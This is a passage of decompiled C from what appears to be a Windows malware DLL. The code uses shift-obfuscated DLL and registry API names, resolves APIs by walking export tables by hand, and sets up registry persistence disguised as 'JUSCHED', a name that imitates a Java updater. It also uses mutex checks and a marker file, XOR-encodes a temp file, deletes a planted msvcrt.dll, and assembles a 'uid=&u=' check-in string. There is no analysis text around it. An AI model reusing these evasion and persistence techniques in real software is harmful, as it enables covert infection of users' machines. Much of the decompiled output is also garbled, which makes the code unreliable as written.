    GetTempPathW(nBufferLength, (int16_t *)&g161);
    int32_t lpFileName; // bp-3124, 0x100038a0
    int32_t v5; // bp-5136, 0x100038a0
    if (function_100029d0(&v5) < 0) {
        goto lab_0x1000399b;
    } else {
        int32_t v6 = 2 * v5 + (int32_t)&lpFileName; // 0x10003967
        int32_t v7 = 0x7fffffff - v5; // 0x1000396a
        if (v7 == 0) {
            // 0x10003996
            *(int16_t *)(v6 - 2) = 0;
            goto lab_0x1000399b;
        } else {
            int32_t v8 = 0x7ffffffe; // 0x10003974
            int32_t v9 = v7;
            int32_t v10 = v6;
            while (v8 != 0) {
                // 0x1000397a
                int128_t v11; // bp-124, 0x100038a0
                int16_t v12 = *(int16_t *)((int32_t)&v11 - v6 + v10); // 0x1000397a
                if (v12 == 0) {
                    // break -> 0x1000398f
                    break;
                }
                // 0x10003983
                *(int16_t *)v10 = v12;
                int32_t v13 = v10 + 2; // 0x10003987
                int32_t v14 = v9 - 1; // 0x1000398a
                v8--;
                int32_t v15 = v13; // 0x1000398b
                if (v14 == 0) {
                    // 0x10003996
                    *(int16_t *)(v15 - 2) = 0;
                    goto lab_0x1000399b;
                }
                v9 = v14;
                v10 = v13;
            }
            // 0x1000398f
            if (v9 != 0) {
                // 0x10003996
                *(int16_t *)v10 = 0;
                goto lab_0x1000399b;
            } else {
                // 0x10003996
                *(int16_t *)(v10 - 2) = 0;
                goto lab_0x1000399b;
            }
        }
    }
  lab_0x1000399b:;
    int32_t v16 = 10; // bp-16, 0x100039ba
    int32_t * hFile = CreateFileW((int16_t *)&lpFileName, -0x80000000, 1, NULL, 3, 128, NULL); // 0x100039c0
    int32_t v17; // 0x100038a0
    int32_t v18; // 0x100038a0
    int32_t * v19; // 0x100038a0
    int32_t v20; // 0x100038a0
    char * v21; // bp-112, 0x100038a0
    int32_t lpString; // bp-1124, 0x100038a0
    int32_t lpNumberOfBytesRead; // bp-5128, 0x100038a0
    int32_t v22; // 0x100038a0
    if (hFile == (int32_t *)-1) {
        int32_t * v23 = CreateFileW((int16_t *)&lpFileName, 0x40000000, 1, NULL, 2, 128, NULL); // 0x10003a9e
        v21 = (char *)&lpString;
        int32_t v24 = lstrlenA((char *)&lpString); // 0x10003ab2
        v17 = &lpNumberOfBytesRead;
        v18 = &lpString;
        v20 = (int32_t)&v21;
        v19 = v23;
        v22 = v24;
    } else {
        // 0x100039cf
        int32_t lpBuffer; // bp-5124, 0x100038a0
        ReadFile(hFile, &lpBuffer, 2000, &lpNumberOfBytesRead, NULL);
        CloseHandle(hFile);
        int32_t * v25 = (int32_t *)(nBufferLength + 4); // 0x100039f0
        in = (struct {int32_t e0;}){
            .e0 = 0
        };
        in.e0 = *v25;
        lstrcpyA((char *)&lpString, inet_ntoa(in));
        v21 = (char *)&lpString;
        int32_t v26 = (int32_t)&v21; // 0x10003a13
        uint32_t v27 = lstrlenA((char *)&lpString); // 0x10003a16
        int32_t v28 = v26; // 0x10003a1a
        if (v27 >= 1) {
            int32_t v29 = v26; // 0x10003a2e
            int32_t v30 = 0; // 0x10003a2f
            int32_t v31; // bp-4, 0x100038a0
            char * v32 = (char *)((int32_t)&v31 - 1120 + v30); // 0x10003a20
            *v32 = *v32 ^ 35;
            v29 -= 4;
            *(int32_t *)v29 = (int32_t)&lpString;
            v30++;
            uint32_t v33 = lstrlenA((char *)&g161); // 0x10003a30
            v28 = v29;
            while (v30 < v33) {
                // 0x10003a20
                v32 = (char *)((int32_t)&v31 - 1120 + v30);
                *v32 = *v32 ^ 35;
                v29 -= 4;
                *(int32_t *)v29 = (int32_t)&lpString;
                v30++;
                v33 = lstrlenA((char *)&g161);
                v28 = v29;
            }
        }
        // 0x10003a36
        *(int32_t *)(v28 - 4) = *v25;
        char * v34 = inet_ntoa((struct {int32_t e0;}){
            .e0 = (int32_t)&g161
        }); // 0x10003a3f
        *(int32_t *)(v28 - 8) = (int32_t)v34;
        int32_t v35 = v28 - 12; // 0x10003a4c
        *(int32_t *)v35 = (int32_t)&lpBuffer;
        char * v36 = StrStrIA((char *)&g161, (char *)&g161); // 0x10003a4d
        if (v36 != NULL) {
            // 0x10003ae2
            *(int32_t *)(v35 - 4) = 0;
            freeaddrinfo((struct addrinfo *)&g161);
            return _40___security_check_cookie_40_4();
        }
        int32_t v37 = (int32_t)v36; // 0x10003a4d
        *(int32_t *)(v28 - 16) = v37;
        *(int32_t *)(v28 - 20) = 128;
        *(int32_t *)(v28 - 24) = 4;
        *(int32_t *)(v28 - 28) = v37;
        *(int32_t *)(v28 - 32) = 1;
        *(int32_t *)(v28 - 36) = 4;
        *(int32_t *)(v28 - 40) = (int32_t)&lpFileName;
        int32_t * v38 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10003a6f
        *(int32_t *)(v28 - 44) = 0;
        int32_t v39 = &lpNumberOfBytesRead;
        *(int32_t *)(v28 - 48) = v39;
        int32_t v40 = v28 - 52; // 0x10003a82
        int32_t v41 = &lpString;
        *(int32_t *)v40 = v41;
        int32_t v42 = lstrlenA((char *)&g161); // 0x10003a83
        v17 = v39;
        v18 = v41;
        v20 = v40;
        v19 = v38;
        v22 = v42;
    }
    int32_t v43 = (int32_t)v19;
    *(int32_t *)(v20 - 4) = v22;
    *(int32_t *)(v20 - 8) = v18;
    *(int32_t *)(v20 - 12) = v43;
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    *(int32_t *)(v20 - 16) = 0;
    *(int32_t *)(v20 - 20) = v17;
    *(int32_t *)(v20 - 24) = 1;
    *(int32_t *)(v20 - 28) = (int32_t)&v16;
    *(int32_t *)(v20 - 32) = v43;
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    int32_t v44 = v20 - 36; // 0x10003adb
    *(int32_t *)v44 = v43;
    CloseHandle(&g161);
    // 0x10003ae2
    *(int32_t *)(v44 - 4) = 0;
    freeaddrinfo((struct addrinfo *)&g161);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10003b00 - 0x10003b4e
int32_t function_10003b00(int32_t hWnd, uint32_t Msg, int32_t wParam, int32_t lParam) {
    if (Msg >= 18) {
        // 0x10003b27
        if (Msg == 22) {
            // 0x10003b16
            return 23;
        }
        if (Msg == 537) {
            // 0x10003b34
            function_1000a2b0();
        }
        // 0x10003b39
        return DefWindowProcW((int32_t *)hWnd, Msg, wParam, lParam);
    }
    // 0x10003b0c
    if (Msg == 17) {
        // 0x10003b16
        return 23;
    }
    int32_t v1 = Msg - 1; // 0x10003b10
    if (v1 == 0) {
        // 0x10003b16
        return 0;
    }
    // 0x10003b13
    if (v1 == 1) {
        // 0x10003b16
        return 23;
    }
    // 0x10003b39
    return DefWindowProcW((int32_t *)hWnd, Msg, wParam, lParam);
}

// Address range: 0x10003b50 - 0x10003cb9
int32_t function_10003b50(void) {
    // 0x10003b50
    int32_t lpConsoleTitle; // bp-520, 0x10003b50
    GetConsoleTitleA((char *)&lpConsoleTitle, 500);
    int32_t lpWindowName; // bp-528, 0x10003b50
    int32_t * hWnd = FindWindowA(NULL, (char *)&lpWindowName); // 0x10003b84
    function_1000a2b0();
    int32_t v1 = GetWindowLongW(hWnd, -6); // 0x10003b94
    int128_t v2; // 0x10003b50
    int128_t v3 = __asm_xorps(v2, v2); // 0x10003b9a
    __asm_movdqu((int128_t)(int32_t)&lpConsoleTitle, v3);
    int32_t v4; // 0x10003b50
    __asm_movdqu((int128_t)v4, v3);
    GetStockObject((int32_t)&g161);
    int32_t * hInstance = (int32_t *)v1; // 0x10003bcd
    LoadCursorW(hInstance, (int16_t *)0x7f00);
    LoadIconW(hInstance, (int16_t *)0x7f00);
    int16_t * lpWndClass = (int16_t *)3; // bp-632, 0x10003c00
    RegisterClassW((struct tagWNDCLASSW *)&lpWndClass);
    int32_t lpMsg = v1; // bp-656, 0x10003c10
    int32_t * hWnd2 = CreateWindowExW(0, (int16_t *)&g9, (int16_t *)&g8, 0xcf0000, 520, 20, 300, 300, NULL, NULL, hInstance, NULL); // 0x10003c37
    ShowWindow(hWnd2, 0);
    UpdateWindow(hWnd2);
    struct tagMSG * v5 = (struct tagMSG *)&lpMsg; // bp-724, 0x10003c58
    if (!GetMessageW((struct tagMSG *)&lpMsg, hWnd2, 0, 0)) {
        // 0x10003ca0
        return _40___security_check_cookie_40_4();
    }
    int32_t v6 = (int32_t)&v5; // 0x10003c95
    while (g138 == 0) {
        int32_t v7 = v6;
        *(int32_t *)(v7 - 4) = v7 + 52;
        TranslateMessage((struct tagMSG *)&g161);
        *(int32_t *)(v7 - 8) = v7 + 48;
        if (DispatchMessageW((struct tagMSG *)&g161) == 23) {
            // break -> 0x10003ca0
            break;
        }
        // 0x10003c8c
        *(int32_t *)(v7 - 12) = 0;
        *(int32_t *)(v7 - 16) = 0;
        *(int32_t *)(v7 - 20) = (int32_t)hWnd2;
        v6 = v7 - 24;
        *(int32_t *)v6 = v7 + 44;
        bool v8 = GetMessageW((struct tagMSG *)&g161, &g161, (int32_t)&g161, (int32_t)&g161); // 0x10003c96
        if (!v8) {
            // break -> 0x10003ca0
            break;
        }
    }
    // 0x10003ca0
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10003cc0 - 0x10003d17
int32_t function_10003cc0(void) {
    // 0x10003cc0
    int32_t lpBuffer; // bp-1008, 0x10003cc0
    GetEnvironmentVariableA("appdata", (char *)&lpBuffer, 1000);
    lstrcatA((char *)&lpBuffer, "\\Microsoft\\Templates\\msvcrt.dll");
    DeleteFileA((char *)&lpBuffer);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10003d20 - 0x10004a60
int32_t function_10003d20(int32_t a1, int32_t a2) {
    // 0x10003d20
    __chkstk();
    int32_t v1; // 0x10003d20
    int32_t v2; // 0x10003d20
    int32_t v3; // 0x10003d20
    function_10003050(v1, v2, v3);
    int32_t lpModuleName = 0x323d7626; // bp+1272, 0x10003d74
    __asm_movq_10((int64_t)a1, __asm_movq(0x73612e6766647361));
    CreateMutexA((struct _SECURITY_ATTRIBUTES *)&g161, (bool)&g161, (char *)&g161);
    if (GetLastError() == 183) {
        // 0x10003db5
        ExitProcess(0);
        // UNREACHABLE
    }
    // 0x10003dbd
    __asm_movdqu((int128_t)a2, __asm_movdqa_9(g65));
    int128_t v4; // 0x10003d20
    __asm_movdqu(v4, __asm_movdqa_9(g34));
    int128_t v5; // 0x10003d20
    __asm_movdqu(v5, __asm_movdqa_9(0x7171422a35375850583c322f3721554f));
    int128_t v6; // 0x10003d20
    __asm_movdqu(v6, __asm_movdqa_9(g47));
    int128_t v7; // 0x10003d20
    __asm_movdqu(v7, __asm_movdqa_9(g35));
    int128_t v8; // 0x10003d20
    __asm_movdqu(v8, __asm_movdqa_9(g38));
    int128_t v9; // 0x10003d20
    __asm_movdqu(v9, __asm_movdqa_9(g32));
    _memset((int32_t *)0xb0e0b, (int32_t)&g161, (int32_t)&g161);
    lpModuleName = 0x6e72656b;
    GetModuleHandleA((char *)&lpModuleName);
    g137 = function_100058f0();
    function_100058f0();
    int32_t lpBuffer; // bp+7160, 0x10003d20
    GetTempPathA(1000, (char *)&lpBuffer);
    int32_t lpString1; // bp+7152, 0x10003d20
    lstrcatA((char *)&lpString1, "DMCZ0001.dat");
    int32_t lpFileName; // bp+7144, 0x10003d20
    char * v10 = (char *)&lpFileName; // bp-84, 0x10003f98
    int32_t * fileHandle = CreateFileA((char *)&lpFileName, -0x80000000, 7, NULL, 3, 0, NULL); // 0x10003f99
    int32_t v11 = (int32_t)&v10; // 0x10003fa2
    if (fileHandle != (int32_t *)-1) {
        int32_t v12 = (int32_t)fileHandle; // bp-88, 0x10003fa4
        g138 = 1;
        CloseHandle(fileHandle);
        v11 = &v12;
    }
    // 0x10003fb5
    *(int32_t *)(v11 - 4) = 1000;
    Sleep((int32_t)&g161);
    function_10003cc0();
    *(int32_t *)(v11 - 8) = (int32_t)&g72;
    *(int32_t *)&g72 = 0x6e72656b;
    *(int32_t *)&g73 = 0x32336c65;
    *(int32_t *)&g74 = 0x6c6c642e;
    *(char *)&g75 = 0;
    int32_t * moduleHandle = GetModuleHandleA((char *)&g161); // 0x10003fef
    int32_t v13 = v11 - 12; // 0x10003ff9
    *(int32_t *)v13 = (int32_t)"ouemm/emm!!!!!!!!!!!!!";
    *(int32_t *)(v11 + 8) = 0;
    int32_t v14 = lstrlenA((char *)&g161); // 0x10004006
    int32_t v15 = *(int32_t *)(v11 + 4); // 0x10004008
    int32_t v16 = v13; // 0x1000400e
    if (v15 < v14) {
        char * v17 = (char *)(v15 + (int32_t)"ouemm/emm!!!!!!!!!!!!!"); // 0x10004010
        *v17 = *v17 - 1;
        int32_t v18 = v13 - 4; // 0x10004017
        *(int32_t *)v18 = (int32_t)"ouemm/emm!!!!!!!!!!!!!";
        *(int32_t *)(v13 + 16) = v15 + 1;
        uint32_t v19 = lstrlenA((char *)&g161); // 0x10004020
        uint32_t v20 = *(int32_t *)(v13 + 12); // 0x10004022
        v16 = v18;
        while (v20 < v19) {
            int32_t v21 = v18;
            v17 = (char *)(v20 + (int32_t)"ouemm/emm!!!!!!!!!!!!!");
            *v17 = *v17 - 1;
            v18 = v21 - 4;
            *(int32_t *)v18 = (int32_t)"ouemm/emm!!!!!!!!!!!!!";
            *(int32_t *)(v21 + 16) = v20 + 1;
            v19 = lstrlenA((char *)&g161);
            v20 = *(int32_t *)(v21 + 12);
            v16 = v18;
        }
    }
    int32_t v22 = v16 - 4; // 0x1000402a
    *(int32_t *)v22 = (int32_t)"bewbqj43/emm";
    *(int32_t *)(v16 + 16) = 0;
    int32_t v23 = lstrlenA((char *)&g161); // 0x10004037
    int32_t v24 = *(int32_t *)(v16 + 12); // 0x10004039
    int32_t v25 = v22; // 0x1000403f
    if (v24 < v23) {
        char * v26 = (char *)(v24 + (int32_t)"bewbqj43/emm"); // 0x10004041
        *v26 = *v26 - 1;
        int32_t v27 = v22 - 4; // 0x10004048
        *(int32_t *)v27 = (int32_t)"bewbqj43/emm";
        *(int32_t *)(v22 + 16) = v24 + 1;
        uint32_t v28 = lstrlenA((char *)&g161); // 0x10004051
        uint32_t v29 = *(int32_t *)(v22 + 12); // 0x10004053
        v25 = v27;
        while (v29 < v28) {
            int32_t v30 = v27;
            v26 = (char *)(v29 + (int32_t)"bewbqj43/emm");
            *v26 = *v26 - 1;
            v27 = v30 - 4;
            *(int32_t *)v27 = (int32_t)"bewbqj43/emm";
            *(int32_t *)(v30 + 16) = v29 + 1;
            v28 = lstrlenA((char *)&g161);
            v29 = *(int32_t *)(v30 + 12);
            v25 = v27;
        }
    }
    int32_t v31 = (int32_t)moduleHandle; // 0x10003fef
    int32_t v32 = v25;
    int32_t v33 = v32 + 1184; // 0x1000405b
    *(int32_t *)v33 = 0x64616f4c;
    *(int32_t *)(v32 + 1188) = 0x7262694c;
    *(int32_t *)(v32 + 1192) = 0x41797261;
    *(char *)(v32 + 1196) = 0;
    int32_t * v34 = (int32_t *)(v31 + 60); // 0x10004084
    int32_t v35 = v31 + 120;
    int32_t v36 = *(int32_t *)(*v34 + v35) + v31; // 0x10004092
    int32_t * v37 = (int32_t *)(v32 - 4); // 0x10004094
    *v37 = v33;
    int32_t * v38 = (int32_t *)(v32 - 8); // 0x10004095
    *v38 = v31;
    int32_t v39 = function_10007210((int32_t)&g161, (char *)&g161); // 0x1000409e
    uint16_t v40 = *(int16_t *)(2 * v39 + v31 + *(int32_t *)(v36 + 36)); // 0x100040ac
    int32_t v41 = *(int32_t *)(*(int32_t *)(v36 + 28) + v31 + 4 * (int32_t)v40); // 0x100040ba
    g137 = v41 + v31;
    *v37 = v32 + 44;
    *v38 = 0;
    *(int32_t *)(v32 - 12) = 0;
    *(int32_t *)(v32 - 16) = 0x10002170;
    *(int32_t *)(v32 - 20) = 0;
    *(int32_t *)(v32 - 24) = 0;
    *(int32_t *)(v32 - 32) = 0;
    int32_t v42 = v32 - 36; // 0x100040df
    *(int32_t *)v42 = 0;
    int32_t * v43 = (int32_t *)(v32 - 40); // 0x100040e1
    *v43 = 0x10003b50;
    *(int32_t *)(v32 - 44) = 0;
    int32_t * v44 = (int32_t *)(v32 - 48); // 0x100040e8
    *v44 = 0;
    int32_t * v45 = (int32_t *)(v32 - 52); // 0x100040ec
    *v45 = (int32_t)"bewbqj43/emm";
    g120 = (int16_t *)0x700041;
    g121 = 0x440070;
    g122 = 0x740061;
    g123 = 97;
    g132 = (int16_t *)0x69004d;
    g133 = 0x720063;
    g134 = 0x73006f;
    g135 = 0x66006f;
    g136 = 116;
    *(int32_t *)(v32 - 28) = v32 + 24;
    int32_t v46 = v32 + 1132; // 0x10004155
    *(int32_t *)(v32 - 56) = v46;
    *(int32_t *)v46 = 0x776c6873;
    *(int32_t *)(v32 + 1136) = 0x2e697061;
    *(int32_t *)(v32 + 1140) = 0x6c6c64;
    *(int32_t *)(v32 - 60) = 300;
    int32_t * v47 = (int32_t *)(v32 - 64); // 0x10004190
    *v47 = v32 + 0x1be8;
    *(int32_t *)(v32 - 68) = 0;
    GetModuleFileNameA(&g161, (char *)&g161, (int32_t)&g161);
    int32_t v48 = v32 + 1080; // 0x100041a0
    int32_t v49 = v32 + 3108; // 0x100041ac
    int32_t v50 = 0; // 0x1000419b
    *(int16_t *)(2 * v50 + v49) = (int16_t)(*(char *)(v50 + v48) ^ 35);
    v50++;
    int32_t v51 = 32; // 0x100041b8
    int32_t v52 = 0; // 0x100041b8
    while (v50 != 32) {
        // 0x100041a0
        *(int16_t *)(2 * v50 + v49) = (int16_t)(*(char *)(v50 + v48) ^ 35);
        v50++;
        v51 = 32;
        v52 = 0;
    }
    char v53 = *(char *)(v52 + (int32_t)&g15); // 0x100041c0
    int32_t v54 = v52 + 1; // 0x100041c6
    *(int16_t *)(2 * v51 + v49) = (int16_t)(v53 ^ 35);
    v51++;
    v52 = v54;
    while (v54 != 13) {
        // 0x100041c0
        v53 = *(char *)(v52 + (int32_t)&g15);
        v54 = v52 + 1;
        *(int16_t *)(2 * v51 + v49) = (int16_t)(v53 ^ 35);
        v51++;
        v52 = v54;
    }
    // 0x100041ef
    *v45 = 45;
    *v43 = 13;
    *(int16_t *)(v32 + 3198) = 0;
    int32_t * v55 = (int32_t *)(v32 - 72); // 0x10004200
    *v55 = (int32_t)"SfhPqfoLfzFyX";
    int32_t v56 = v32 - 76; // 0x10004205
    int32_t * v57 = (int32_t *)v56; // 0x10004205
    *v57 = v32 + 1116;
    lstrcpyA((char *)&g161, (char *)&g161);
    int32_t v58 = v32 + 1108; // 0x10004210
    for (int32_t i = 0; i < 13; i++) {
        char * v59 = (char *)(i + v58); // 0x10004210
        *v59 = *v59 - 1;
    }
    // 0x1000421d
    *v44 = 13;
    int32_t * v60 = (int32_t *)(v32 - 80); // 0x10004235
    *v60 = v58;
    int32_t * v61 = (int32_t *)(v32 - 84); // 0x10004236
    *v61 = *v45;
    function_10007210((int32_t)&g161, (char *)&g161);
    *v60 = v42;
    *v61 = 0x20007;
    int32_t v62 = v32 - 88; // 0x10004255
    int32_t * v63 = (int32_t *)v62; // 0x10004255
    *v63 = 0;
    *(int32_t *)(v32 - 92) = v32 + 3100;
    *(int32_t *)(v32 - 96) = -0x7fffffff;
    *(int32_t *)(v32 - 100) = (int32_t)"SfhTfuWbmvfFyX";
    int32_t * v64 = (int32_t *)(v32 - 104); // 0x10004287
    *v64 = v32 + 1088;
    lstrcpyA((char *)&g161, (char *)&g161);
    for (int32_t i = 0; i < 14; i++) {
        char * v65 = (char *)(i + v48); // 0x10004290
        *v65 = *v65 - 1;
    }
    int32_t v66 = *v60; // 0x1000429d
    *v57 = 14;
    int32_t v67 = *(int32_t *)(v66 + 120 + *(int32_t *)(v66 + 60)) + v66; // 0x100042b3
    int32_t * v68 = (int32_t *)(v32 - 108); // 0x100042b5
    *v68 = v48;
    int32_t * v69 = (int32_t *)(v32 - 112); // 0x100042b6
    *v69 = v66;
    int32_t v70 = function_10007210((int32_t)&g161, (char *)&g161); // 0x100042bf
    int32_t v71 = *v60; // 0x100042c7
    int128_t v72 = __asm_movdqa_9(g46); // 0x100042cb
    uint16_t v73 = *(int16_t *)(*(int32_t *)(v67 + 36) + 2 * v70 + v71); // 0x100042d6
    int32_t v74 = *(int32_t *)(*(int32_t *)(v67 + 28) + v71 + 4 * (int32_t)v73); // 0x100042e0
    *(char *)(v32 + 1096) = 0;
    __asm_movdqu(*(int128_t *)v48, v72);
    *v55 = v74 + v71;
    int32_t v75 = *(int32_t *)(v71 + 120 + *(int32_t *)(v71 + 60)) + v71; // 0x10004308
    int32_t * v76 = (int32_t *)(v32 - 116); // 0x1000430a
    *v76 = v48;
    int32_t * v77 = (int32_t *)(v32 - 120); // 0x1000430b
    *v77 = v71;
    int32_t v78 = function_10007210((int32_t)&g161, (char *)&g161); // 0x10004314
    int32_t v79 = *v60; // 0x1000431f
    uint16_t v80 = *(int16_t *)(*(int32_t *)(v75 + 36) + 2 * v78 + v79); // 0x10004326
    int32_t v81 = *(int32_t *)(v75 + 28); // 0x1000432a
    *v68 = v56;
    *v57 = 512;
    *v69 = v32 + 3072;
    *v63 = 1;
    *v76 = v62;
    *v77 = 0;
    *(int32_t *)(v32 - 124) = (int32_t)"JUSCHED";
    int32_t v82 = v32 - 128; // 0x1000435c
    *(int32_t *)v82 = *v47;
    int32_t v83 = v82; // 0x10004367
    if (*(int32_t *)(v81 + v79 + 4 * (int32_t)v80) + v79 == 2) {
        // 0x10004369
        *(int32_t *)(v32 - 132) = 1000;
        *(int32_t *)(v32 - 136) = v32 + 0x13d0;
        *(int32_t *)(v32 - 140) = 0;
        GetModuleFileNameW(&g161, (int16_t *)&g161, (int32_t)&g161);
        *(int32_t *)(v32 - 144) = v32 + 0x13c4;
        *(int32_t *)(v32 - 148) = 2 * lstrlenW((int16_t *)&g161);
        *(int32_t *)(v32 - 152) = v32 + 0x13c0;
        *(int32_t *)(v32 - 156) = 1;
        *(int32_t *)(v32 - 160) = 0;
        *(int32_t *)(v32 - 164) = (int32_t)L"JUSCHED";
        v83 = v32 - 168;
        *(int32_t *)v83 = *v64;
    }
    int32_t v84 = v83;
    *(int32_t *)(v84 - 4) = 0;
    int32_t * v85 = (int32_t *)(v84 - 8); // 0x100043b0
    *v85 = 0;
    *(int32_t *)(v84 - 12) = 0;
    int32_t * v86 = CreateMutexW((struct _SECURITY_ATTRIBUTES *)&g161, (bool)&g161, (int16_t *)&g161); // 0x100043b4
    *(int32_t *)(v84 - 16) = 0;
    *(int32_t *)(v84 - 20) = 0;
    *(int32_t *)(v84 - 24) = 0;
    g139 = (int32_t)v86;
    int32_t * v87 = CreateMutexW((struct _SECURITY_ATTRIBUTES *)&g161, (bool)&g161, (int16_t *)&g161); // 0x100043c1
    int32_t v88 = v84 + 1160; // 0x100043c3
    *(int32_t *)v88 = 0x74726956;
    *(int32_t *)(v84 + 1164) = 0x416c6175;
    *(int32_t *)(v84 + 1168) = 0x636f6c6c;
    int32_t v89 = v84 + 1172; // 0x100043e4
    *(char *)v89 = 0;
    g119 = (int32_t)v87;
    int32_t v90 = *(int32_t *)(*v34 + v35) + v31; // 0x100043ff
    int32_t * v91 = (int32_t *)(v84 - 28); // 0x10004401
    *v91 = v88;
    int32_t * v92 = (int32_t *)(v84 - 32); // 0x10004402
    *v92 = v31;
    int32_t v93 = function_10007210((int32_t)&g161, (char *)&g161); // 0x1000440b
    uint16_t v94 = *(int16_t *)(2 * v93 + v31 + *(int32_t *)(v90 + 36)); // 0x10004419
    int32_t v95 = v94; // 0x10004419
    int32_t v96 = *(int32_t *)(*(int32_t *)(v90 + 28) + v31 + 4 * v95); // 0x10004423
    *(int32_t *)(v84 + 8) = v96 + v31;
    for (int32_t i = 0; i < 115; i++) {
        char * v97 = (char *)(v84 + 1400 + i); // 0x10004430
        *v97 = *v97 - 1;
    }
    // 0x1000443d
    *v85 = 115;
    *v91 = v95;
    *v92 = v84 + 28;
    function_10004a60((int32_t)&g161);
    int32_t v98 = v84 - 36; // 0x1000445a
    int32_t * v99 = (int32_t *)v98; // 0x1000445a
    *v99 = 284;
    int32_t v100 = v84 + 32; // 0x1000445f
    int32_t * v101 = (int32_t *)(v84 - 40); // 0x10004463
    *v101 = 0;
    int32_t * v102 = (int32_t *)(v84 - 44); // 0x10004465
    *v102 = v100;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    *(int32_t *)v100 = 284;
    *v91 = v100;
    GetVersionExW((struct _OSVERSIONINFOW *)&g161);
    int128_t v103 = __asm_movdqa_9(g64); // 0x10004486
    char * v104 = (char *)(v84 + 1431); // 0x10004490
    *v104 = *(char *)v100 + 48;
    *(int32_t *)v89 = 0x74636572;
    *(char *)(v84 + 1433) = *(char *)(v84 + 36) + 48;
    int32_t v105 = v84 + 1156; // 0x100044b0
    __asm_movdqu(*(int128_t *)v105, v103);
    *(int32_t *)(v84 + 1176) = 0x4179726f;
    *(char *)(v84 + 1180) = 0;
    int32_t v106 = *(int32_t *)(*v34 + v35) + v31; // 0x100044da
    *v92 = v105;
    *v99 = v31;
    int32_t v107 = function_10007210((int32_t)&g161, (char *)&g161); // 0x100044e6
    uint16_t v108 = *(int16_t *)(2 * v107 + v31 + *(int32_t *)(v106 + 36)); // 0x100044f4
    int32_t v109 = *(int32_t *)(v106 + 28); // 0x100044f8
    *v92 = 1000;
    int32_t v110 = *(int32_t *)(v109 + v31 + 4 * (int32_t)v108) + v31; // 0x1000450d
    *v99 = v84 + 3148;
    if (v110 != 120 != v110 != 0) {
        // 0x1000451b
        *(int32_t *)(v84 + 1427) = 0x20202020;
        *v104 = 32;
    }
    // 0x1000452e
    *v101 = v84;
    *v102 = v84 + 1388;
    int32_t v111 = function_10004ed0((int32_t)&g161, (int32_t)&g161); // 0x10004549
    int32_t v112 = v98; // 0x10004553
    if (v111 == 0) {
        int32_t v113 = v98;
        int32_t v114 = v113 - 4; // 0x10004560
        *(int32_t *)v114 = 0xea60;
        Sleep((int32_t)&g161);
        *(int32_t *)(v113 - 8) = v113 + 32;
        *(int32_t *)(v113 - 12) = v113 + 1420;
        int32_t v115 = function_10004ed0((int32_t)&g161, (int32_t)&g161); // 0x10004582
        v112 = v114;
        while (v115 == 0) {
            // 0x10004560
            v113 = v114;
            v114 = v113 - 4;
            *(int32_t *)v114 = 0xea60;
            Sleep((int32_t)&g161);
            *(int32_t *)(v113 - 8) = v113 + 32;
            *(int32_t *)(v113 - 12) = v113 + 1420;
            v115 = function_10004ed0((int32_t)&g161, (int32_t)&g161);
            v112 = v114;
        }
    }
    // 0x1000458e
    __asm_movdqu(*(int128_t *)(v112 + 0xb860), __asm_movdqa_9(g62));
    *(int16_t *)(v112 + 0xb870) = 112;
    function_100038a0();
    int32_t v116 = v112 + 2176; // 0x100045b5
    int32_t v117 = v116;
    int32_t v118 = 0x7fffffff;
    char v119 = *(char *)((int32_t)"uid=" - 2176 - v112 + v117); // 0x100045d7
    int32_t v120; // 0x10003d20
    while (v119 != 0) {
        // 0x100045de
        *(char *)v117 = v119;
        int32_t v121 = v117 + 1; // 0x100045e0
        int32_t v122 = v118 - 1; // 0x100045e1
        v120 = v121;
        if (v122 == 1) {
            goto lab_0x100045eb;
        }
        v117 = v121;
        v118 = v122;
        v119 = *(char *)((int32_t)"uid=" - 2176 - v112 + v117);
    }
    // 0x100045e6
    v120 = v117 + (int32_t)(v118 == 0);
  lab_0x100045eb:
    // 0x100045eb
    *(char *)v120 = 0;
    function_10004d80();
    int32_t v123 = v112 - 4; // 0x10004601
    *(int32_t *)v123 = v112 + 1652;
    *(int32_t *)(v112 - 8) = v116;
    lstrcatA((char *)&g161, (char *)&g161);
    int32_t * v124 = (int32_t *)(v112 - 12); // 0x1000460c
    *v124 = (int32_t)"&u=";
    int32_t * v125 = (int32_t *)(v112 - 16); // 0x10004618
    *v125 = v112 + 2168;
    lstrcatA((char *)&g161, (char *)&g161);
    int32_t * v126 = (int32_t *)(v112 - 20); // 0x1000461b
    *v126 = 99;
    *(int32_t *)(v112 + 4) = 100;
    int32_t * v127 = (int32_t *)(v112 - 24); // 0x1000462c
    *v127 = 0;
    int32_t * v128 = (int32_t *)(v112 - 28); // 0x1000462e
    *v128 = v112 + 1529;
    int32_t v129 = v112 + 1528; // 0x1000462f
    *(char *)v129 = 0;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    int32_t v130 = v112 + 1288; // 0x1000463f
    *(int32_t *)v130 = 0x6e72656b;
    *(int32_t *)(v112 + 1292) = 0x32336c65;
    *(int32_t *)(v112 + 1296) = 0x6c6c642e;
    *(char *)(v112 + 1300) = 0;
    *v126 = v130;
    int32_t moduleHandle2 = (int32_t)GetModuleHandleA((char *)&g161); // 0x10004670
    int32_t v131 = v112 + 1164; // 0x10004678
    *(int32_t *)v131 = 0x64616f4c;
    *(int32_t *)(v112 + 1168) = 0x7262694c;
    *(int32_t *)(v112 + 1172) = 0x41797261;
    *(char *)(v112 + 1176) = 0;
    int32_t v132 = *(int32_t *)(moduleHandle2 + 120 + *(int32_t *)(moduleHandle2 + 60)) + moduleHandle2; // 0x100046af
    *v127 = v131;
    *v128 = moduleHandle2;
    int32_t v133 = function_10007210((int32_t)&g161, (char *)&g161); // 0x100046bb
    uint16_t v134 = *(int16_t *)(2 * v133 + moduleHandle2 + *(int32_t *)(v132 + 36)); // 0x100046c9
    int32_t v135 = *(int32_t *)(v132 + 28); // 0x100046cd
    int32_t v136 = v112 + 1524; // 0x100046d6
    int32_t v137 = *(int32_t *)(v135 + moduleHandle2 + 4 * (int32_t)v134) + moduleHandle2; // 0x100046dd
